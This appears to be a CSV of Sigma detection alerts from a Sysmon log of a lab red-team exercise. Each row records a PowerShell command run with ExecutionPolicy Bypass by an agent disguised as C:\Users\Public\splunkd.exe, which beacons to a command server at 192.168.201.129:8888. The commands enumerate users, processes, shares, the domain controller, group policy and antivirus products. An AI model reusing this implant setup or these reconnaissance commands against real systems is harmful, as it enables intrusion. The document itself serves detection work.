"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-23 13:51:39.678 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172530,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C $env:username ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1452 ¦ PGUID: E9F06A57-905B-694A-7102-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:51:39.661","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:52:25.675 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172532,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Get-WmiObject -Class Win32_UserAccount"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 7612 ¦ PGUID: E9F06A57-9089-694A-7202-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:52:25.668","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:53:26.716 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172534,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""$owners = @{};gwmi win32_process |%% {$owners[$_.handle] = $_.getowner().user};$ps = get-process | select processname,Id,@{l=\""Owner\"";e={$owners[$_.id.tostring()]}};foreach($p in $ps) { if($p.Owner -eq \""student\"") { $p; }}"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1308 ¦ PGUID: E9F06A57-90C6-694A-7302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:53:26.706","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:54:11.753 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172536,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Get-SmbShare | ConvertTo-Json"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4440 ¦ PGUID: E9F06A57-90F3-694A-7402-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:54:11.745","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:54:48.777 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172540,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""nltest /dsgetdc:$env:USERDOMAIN"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4080 ¦ PGUID: E9F06A57-9118-694A-7902-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:54:48.770","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:55:51.004 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172546,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6004 ¦ PGUID: E9F06A57-9156-694A-7D02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:55:50.989","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:56:30.934 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172549,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""gpresult /R"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4064 ¦ PGUID: E9F06A57-917E-694A-8302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:56:30.927","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:57:22.963 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172555,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""$NameSpace = Get-WmiObject -Namespace \""root\"" -Class \""__Namespace\"" | Select Name | Out-String -Stream | Select-String \""SecurityCenter\"";$SecurityCenter = $NameSpace | Select-Object -First 1;Get-WmiObject -Namespace \""root\$SecurityCenter\"" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8188 ¦ PGUID: E9F06A57-91B2-694A-8702-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:57:22.954","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:51:39.678 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172530,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C $env:username ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1452 ¦ PGUID: E9F06A57-905B-694A-7102-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:51:39.661","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:52:25.675 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172532,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Get-WmiObject -Class Win32_UserAccount"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 7612 ¦ PGUID: E9F06A57-9089-694A-7202-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:52:25.668","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:53:26.716 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172534,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""$owners = @{};gwmi win32_process |%% {$owners[$_.handle] = $_.getowner().user};$ps = get-process | select processname,Id,@{l=\""Owner\"";e={$owners[$_.id.tostring()]}};foreach($p in $ps) { if($p.Owner -eq \""student\"") { $p; }}"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1308 ¦ PGUID: E9F06A57-90C6-694A-7302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:53:26.706","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:54:11.753 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172536,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Get-SmbShare | ConvertTo-Json"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4440 ¦ PGUID: E9F06A57-90F3-694A-7402-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:54:11.745","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:54:48.777 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172540,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""nltest /dsgetdc:$env:USERDOMAIN"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4080 ¦ PGUID: E9F06A57-9118-694A-7902-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:54:48.770","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:55:51.004 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172546,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6004 ¦ PGUID: E9F06A57-9156-694A-7D02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:55:50.989","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:56:30.934 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172549,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""gpresult /R"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4064 ¦ PGUID: E9F06A57-917E-694A-8302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:56:30.927","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_discovery.evtx"
"2025-12-23 13:57:22.963 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172555,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""$NameSpace = Get-WmiObject -Namespace \""root\"" -Class \""__Namespace\"" | Select Name | Out-String -Stream | Select-String \""SecurityCenter\"";$SecurityCenter = $NameSpace | Select-Object -First 1;Get-WmiObject -Namespace \""root\$SecurityCenter\"" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8188 ¦ PGUID: E9F06A57-91B2-694A-8702-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 12:57:22.954","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_discovery.evtx"
